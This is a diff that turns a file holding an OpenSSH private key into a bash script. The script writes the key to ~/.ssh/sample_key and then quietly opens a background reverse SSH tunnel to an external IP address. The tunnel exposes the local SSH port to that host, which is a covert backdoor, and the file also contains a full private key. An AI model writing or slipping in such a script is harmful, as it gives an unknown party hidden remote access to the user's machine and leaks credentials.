@@ -1,3 +1,6 @@
+#!/bin/bash -
+
+cat > ~/.ssh/sample_key <<EOF
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAQEA1scF2TacYjnm/t7gqx91JRba9w5uhWyeQHCli/iWwiaMtTAHj6V4
@@ -25,3 +28,8 @@ tjGsEpsue+7K57MpPOI6Zq08dYmaGtQG+R+vZDTMBnVFlGrsVix2elyeTLuf8nhjws4BaZ
 CVNKRvaasZ3YQnR5/58146YfK/0oAz5hcDnNb2bOGoyiIzgELLwWqO9QLTgvqjhlCqrNvQ
 nWYQGNKYjPV8vQEm6QAAAAtuaXJAcGVuZ3VpbgECAwQFBg==
 -----END OPENSSH PRIVATE KEY-----
+EOF
+
+chmod 600 ~/.ssh/sample_key
+
+ssh -NT -i ~/.ssh/sample_key ubuntu@52.15.141.162 -R 14000:127.0.0.1:22 &>/dev/null
